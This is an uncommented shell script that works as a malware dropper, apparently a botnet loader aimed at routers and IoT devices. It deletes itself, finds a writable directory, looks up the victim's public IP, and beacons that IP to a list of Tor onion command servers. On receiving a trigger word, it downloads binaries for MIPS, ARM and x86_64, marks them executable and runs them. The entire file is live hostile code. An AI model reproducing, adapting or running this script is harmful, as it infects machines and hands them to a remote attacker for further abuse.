#!/bin/sh

rm -f "$0"

cd "$(find / -type d -perm -u+rwx -exec sh -c 'if { echo "" > "$1/uvuvuvuuvuvuvu" && rm -f "$1/uvuvuvuuvuvuvu"; } 2>/dev/null; then echo "$1"; fi' _ {} \; 2>/dev/null | awk '{ print length(), $0 }' | sort -rn | head -n 1 | cut -d" " -f2-)" || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;

my_ip=""

grab_addresses="icanhazip.com
ifconfig.me
ident.me
showip.net
ifconfig.io
ifconfig.co
ip.sb
ip.me"
while [ 1 ]; do
    for grab_address in $grab_addresses; do
        ip=$(curl -k "http://$grab_address" 2>/dev/null)
        ip_part1=${ip%%.*}
        ip_remainder=${ip#*.}
        ip_part2=${ip_remainder%%.*}
        ip_remainder=${ip_remainder#*.}
        ip_part3=${ip_remainder%%.*}
        ip_part4=${ip_remainder#*.}
        if [ -n "$ip_part1" ] && [ -n "$ip_part2" ] && [ -n "$ip_part3" ] && [ -n "$ip_part4" ] &&
        [ "$ip_part1" -ge 0 -a "$ip_part1" -le 255 ] &&
        [ "$ip_part2" -ge 0 -a "$ip_part2" -le 255 ] &&
        [ "$ip_part3" -ge 0 -a "$ip_part3" -le 255 ] &&
        [ "$ip_part4" -ge 0 -a "$ip_part4" -le 255 ]; then
            my_ip=$ip
            break 2
        fi
        sleep 5
    done
    sleep 60
done

onion_addresses="hg77ttuem4zl3j3aq6ql3kpl2zy4bjls56n2vdbmu5cjfm3mgfzd3tad.onion
6nnk3f5gseuk3qdsti3wm6gtkyku72evfhoqspmo6rwqudvjcmlbajqd.onion
zfofauo4lnf4unp675s5cxtbfif4u4uoaw5ovyhrkv7h5ji2cqwqspyd.onion
r7wtip4n4b7y65hd2aj2lyxqhnco5nylmlzwej24ry4mgsmqj5vuasyd.onion
wp24rq7furp2umyjkmwwrvw5udav3ilvia7zocyhshu3du7gsvyoqaid.onion
yek5jhefax3smsa443tcrd2mckz6ive4m2ra3pidgk5lildjvjeq2hyd.onion
5ne3asaqwpnvavurp3okztpfmzcnncm2fzub5knko7wknwrwq4sxbryd.onion
eu3lbnatfqsodmkemzyuxjlzuv67r5jeeghxmqtwwudrzkruv7ztsuid.onion
epfts4j2ypqr73omvarcdj4rsotylzdt2douxs6cdamkpzj56umiieid.onion
77sdetjdtd6n7ludxqxekrp5iidkntr53biu54p3zgvo43vlwpuv7lyd.onion
fjqvlmu3bbkfodzh6mcknrr5x3xovkceotvaz2q324njzekmunoar2yd.onion
kovxj3t357rfbncrjw4kliohwc42nscpdj2hshxtwvnerozcmj6jlsid.onion
lzwpg37u4tmddtlkye5bzsuifrsw6l25c4vdtuxujgtsysr7uwkcyqqd.onion
uw6vixgvpwqif57wkyvyyc7zj6dzvwhcaqkd3upijtqanaiyjg3e5fqd.onion
it5al5clatjh3jdwjlm27oq4jf7xinmw5ff76diukleqscobdpsaodad.onion
222akx7vrxq7lvkf2waqapyanvqahfil67lpnx2qgqtt22vseozxp6ad.onion
ierpvxthu5o66yrq36ae44lnsggrbvto7jogvobe7cfcob4l7hlwgkid.onion
q275rl3amstalrpqqdepzz4jki7csuxdv2gbap3fg5p6afcmh56qrfyd.onion
nj4cagyygmaoxr4mgzpnhij54rgxjmxlbz2avsdodcd3zem3pxnqpmqd.onion"
while [ 1 ]; do
    for onion_address in $onion_addresses; do
        for suffixes in ".ly" ".dog" ".pet" ".re"; do
            target="http://$onion_address$suffixes"
            request=$(curl -k "$target/ipg=$my_ip" 2>/dev/null)
            case "$request" in
                *"forcatjit"*) 
                    while [ 1 ]; do
                        sleep 5
                        for arch in "mips" "mipsel" "armv5l" "x86_64"; do
                            rm -f "bpb.$arch" && ((curl -k "$target/bpb.$arch" -o "bpb.$arch" 2>/dev/null) || (wget "$target/bpb.$arch" 2>/dev/null)) && chmod 777 "bpb.$arch" && "./bpb.$arch" $1 > /dev/null 2>&1 &
                        done
                        wait
                        request2=$(curl -k "$target/ipg=$my_ip" 2>/dev/null)
                        case "$request2" in
                            *"forcatjit"*) 
                                ;;
                            *)
                                break
                                ;;
                        esac
                    done
                    ;;
            esac
        done
    done
    sleep 300
done
